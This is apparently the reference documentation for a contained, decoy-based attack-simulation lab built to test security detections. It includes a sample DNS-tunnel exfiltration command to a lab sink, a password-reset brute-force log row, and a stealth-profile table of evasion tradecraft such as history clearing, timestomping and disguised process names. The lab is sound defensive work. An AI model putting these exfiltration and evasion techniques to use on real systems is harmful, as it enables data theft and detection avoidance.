# Reference

Everything beyond the quick-start guide in the [README](../README.md).

Contents: [The activity log](#the-activity-log) · [Safety design](#safety-design) · [Components](#components) ·
[Running pieces separately](#running-pieces-separately) ·
[Stealth profiles](#stealth-profiles) ·
[OWASP Top 10:2025 scenarios](#owasp-top-10-2025-scenarios) ·
[MITRE ATT&CK coverage](#mitre-attck-coverage) · [Artifacts](#artifacts)

## The activity log

Every action a scenario performs is recorded in `results/activity.jsonl`,
one JSON line each, and shown as a table at the bottom of every scenario,
every chain, and the end of `run-everything.sh`:

```
Time          Technique  Command              Source       Destination   Path / ID
09:43:44.808  OWASP-A06  curl -s -X GET       ops-console  web-portal    /reset?user=alice&code=0000 (x91 over 2s)
09:41:15.898  T1048.003  dig +short @dns-sink A  ops-console  dns-sink   0.1794044475.ewogICJD…exfil.internal
```

| column | meaning |
|---|---|
| Time | UTC, millisecond precision |
| Technique | ATT&CK technique ID, or `OWASP-Axx` |
| Command | what was run or sent |
| Source / Destination | container (compose service) names; the decoy metadata service is shown as `ops-console (decoy IMDS)`, and `docker` commands show `docker-sandbox` |
| Path / ID | URL path, file path, DNS name, or other unique identifier |

Under the table, **Attacks covered** lists every technique that ran, with
its name and how many actions it comprised.

Bursts of the same action (a brute-force loop, sequential IDs) are
collapsed to one row with a count in the printed table. Nothing is lost:
`activity.csv` and `activity.jsonl` hold every row and extra fields
(`step`, `result`, `scenario`, `profile`).

```bash
python3 playbooks/activity-report.py results/activity.jsonl --full          # every row, as a table
python3 playbooks/activity-report.py results/activity.jsonl --format csv    # CSV
python3 playbooks/activity-report.py results/activity.jsonl --scenario run-owasp-top10
python3 playbooks/activity-report.py results/activity.jsonl --since 1794044400   # epoch seconds
```

The log is written by plain bash built-ins on purpose: recording it never
starts an extra process, so the bookkeeping cannot show up as attacker
behaviour in your telemetry. Technique names come from
`playbooks/techniques.tsv`. `activity.jsonl` accumulates across runs; the
report from `run-everything.sh` covers only that run.

## Safety design

This lab intentionally runs attacker-style behaviour and weak
configurations, so safety comes from how it is contained:

- **Disposable VM.** The only real isolation. The privileged
  Docker-in-Docker sandbox (`compose.privileged.yml`) shares the host
  kernel and has an unauthenticated Docker API, so it is **not** a
  security boundary. Never run this on a workstation, shared server or
  production system.
- **Internal network.** `northline-net` is `internal: true`: no internet,
  no route to the Docker host. Only the setup phase uses a separate
  `setup-net` for installs, and `lock-down-network.sh` removes it before
  any scenario runs (`run-everything.sh` does this for you). If you run
  scenarios by hand, run `bash lock-down-network.sh` after installing tools.
- **No published ports.** Nothing is reachable from outside the VM.
- **Decoys only.** Every credential, key, token and document is fabricated
  and marked `DECOY`.
- **Guards.** Playbooks that touch `~/.ssh`, `~/.aws`, `~/.bashrc`, crontab
  or shell history refuse to run outside `ops-console` (`LAB_CONTAINER=1`),
  and `seed-decoys.sh --cleanup` only removes files it created.
- **Read-only mounts.** `ops-console` cannot modify the service code that
  other containers run.
- **Decoy web app.** `web-portal` is deliberately vulnerable, runs shell
  injection as `nobody`, and has no egress.

To report a problem, see [SECURITY.md](../SECURITY.md).

## Components

| | |
|---|---|
| `compose.yml` | base setup: `ops-console` (Kali attacker box), `dns-sink`, `control-api`, `internal-host`, `web-portal` (decoy vulnerable web app) |
| `compose.privileged.yml` | overlay adding a Docker-in-Docker sandbox for the container-escape scenarios, see its header |
| `run-everything.sh` | host-side one-command runner (`--only`, `--stealth`) |
| `lock-down-network.sh` | host-side: removes the setup-phase egress network so scenarios run with no internet access |
| `services/metadata_api.py` | decoy cloud instance-metadata service, serves decoy IAM creds |
| `services/dns_sink.py` | DNS sink; logs queries, reassembles DNS-tunnel exfil |
| `services/control_api.py` | decoy C2/cloud API: beacon/tasking, mining-pool, cloud-identity, logging-control and decoy-package endpoints |
| `services/webapp.py` | deliberately vulnerable decoy web app for the OWASP scenarios (`web-portal`) |
| `playbooks/` | setup + one script per scenario |
| `playbooks/lib-stealth.sh` | stealth profile definitions and helpers |
| `playbooks/lib-activity.sh`, `playbooks/activity-report.py`, `playbooks/techniques.tsv` | the activity log: recording, table/CSV report, technique names |
| `playbooks/run-stealth-sweep.sh` | runs the base chain at every stealth profile and prints a comparison |
| `playbooks/run-owasp-top10.sh` | OWASP Top 10:2025 application-attack scenarios |

## Running pieces separately

`run-everything.sh --only mitre|owasp` covers the common cases. For
anything finer, drive the containers yourself. Three levels, from
broadest to narrowest; each is independent. (After installing tools, run
`bash lock-down-network.sh` from the host before scenarios.)

**All base scenarios:**

```bash
docker compose up -d
docker compose exec ops-console bash playbooks/bootstrap.sh
docker compose exec ops-console bash playbooks/install-extra-tools.sh
docker compose exec ops-console bash playbooks/run-all.sh
```

**All overlay scenarios** (the ones marked (overlay) in the table below):

```bash
docker compose -f compose.yml -f compose.privileged.yml up -d
docker compose -f compose.yml -f compose.privileged.yml exec ops-console \
    bash playbooks/bootstrap.sh
docker compose -f compose.yml -f compose.privileged.yml exec ops-console \
    bash playbooks/install-container-tools.sh
docker compose -f compose.yml -f compose.privileged.yml exec ops-console \
    bash playbooks/run-privileged-chain.sh
```

**One scenario at a time**, against whichever of the above you brought up:

```bash
docker compose exec ops-console bash playbooks/run-host-recon.sh
```

Any scenario script can be run on its own this way, in any order, as many
times as you like; each one is self-contained and writes its own log to
`./results/`.

## Stealth profiles

The lab is noisy by default so detections fire. Stealth profiles let you
run the **same decoy scenarios more quietly**, to check whether your
EDR/CDR still detects a careful attacker.

```bash
bash run-everything.sh --stealth quiet          # or STEALTH=quiet ...
docker compose exec ops-console bash playbooks/run-stealth-sweep.sh   # all four, side by side
STEALTH_TIME_SCALE=0.01 ...                      # shrink every wait for quick demos
```

| profile | timing | tooling | artifacts |
|---|---|---|---|
| `noisy` (default) | 1-4 s beacon jitter, no DNS delay | `nmap`, `curl`, 48-char DNS labels, `sshpass -p`, broad `find`, full recon | obvious names, staged in `results/`, history cleared, timestomp |
| `careful` | 5-15 s jitter, 1-2 s DNS delay | `nmap -T2` on fewer ports, realistic UA, 32-char labels, `sshpass -e`, scoped `find`/SUID search, no `env` dump | staged under `~/.cache`, quieter process name |
| `quiet` | 30-90 s jitter, 2-5 s DNS delay, niced load | single `/dev/tcp` probe instead of `nmap`, `python3` instead of `curl`, 24-char labels, known-path credential checks, minimal recon | staging copy removed, no history-clear/timestomp |
| `covert` | 120-300 s jitter, 5-15 s DNS delay | no port scan, 12-char labels | as `quiet`, less obvious binary name |

Override one dimension with `STEALTH_TIMING`, `STEALTH_TOOLING` or
`STEALTH_ARTIFACTS` (e.g. `STEALTH=quiet STEALTH_TOOLING=noisy`).
Every action is recorded in the [activity log](#the-activity-log), with
the profile used, so you can line EDR/CDR alerts up against exactly what
ran (`stealth_timeline.jsonl` keeps the older, step-level view). The profile table is in one place:
`playbooks/lib-stealth.sh`.

**Scope:** profiles only change *how* the existing decoy techniques are
performed (timing, volume, tooling, naming, tidiness). They never stop,
blind, unhook or modify the security agent, and every target remains a
lab decoy.

## OWASP Top 10 2025 scenarios

The ATT&CK scenarios test host and cloud behaviour. These test
**application attacks**: `run-owasp-top10.sh` drives a deliberately
vulnerable decoy web app (`web-portal`, `services/webapp.py`) so WAF, API,
CDR and runtime sensors have genuine application-layer telemetry to detect.

The actions are real (the app really runs the SQL, shell, outbound fetch,
file read and `pickle.loads`); the payloads are inert and `DECOY`-tagged,
and only touch decoy data in an isolated container (internal network only,
no published ports, no egress, command injection runs as `nobody`).
This is a telemetry generator, not a training target.

```bash
docker compose exec ops-console bash playbooks/run-owasp-top10.sh          # all ten
docker compose exec ops-console bash playbooks/run-owasp-top10.sh A01 A05  # selected
STEALTH=quiet ...                                                          # honours stealth profiles
```

The ten categories and the tests run for each are listed in the
[README](../README.md#every-test-in-this-lab).

Ground truth for what the app really did is `results/webapp_events.jsonl`
(category, vulnerability, endpoint, client); the app's own deliberately weak
log is `results/webapp_app.log`; the playbook's steps go to
`stealth_timeline.jsonl` as `OWASP-A0x`. Some categories (A01, A05, A07) are
visible from a single request. Others (A02, A03, A06, A09, A10) are design or
configuration weaknesses, so what a sensor sees is the exploitation traffic,
not the weakness itself: read a missing alert there with that in mind.
Category names and links were checked against the published
[OWASP Top 10:2025](https://owasp.org/Top10/2025/) list.

## MITRE ATT&CK coverage

The complete, linked list of techniques and the scripts that run them is the last
section of the [README](../README.md#every-test-in-this-lab); it is built from
what the scripts actually record.

Setup/orchestration scripts, not mapped to a technique:

| Script | Purpose |
|---|---|
| `seed-decoys.sh` | plants decoy SSH key, cloud creds, browser-login store, K8s service-account token, decoy documents (prereq for several scenarios above) |
| `run-full-chain.sh` | runs every base scenario above in one multi-stage, correlatable kill chain |
| `run-all.sh` | setup plus `run-full-chain.sh` in one command |
| `run-privileged-chain.sh` | runs all the overlay scenarios, plus the two cloud-native ones that need no extra privileges |

## Artifacts

All scenarios write to `./results/` (gitignored): per-scenario run logs,
the decoy credential blob, the DNS sink's reassembled
`exfil_<session>.decoded`, staged archives, and `control-api`'s beacon/pool/
identity/logging logs.
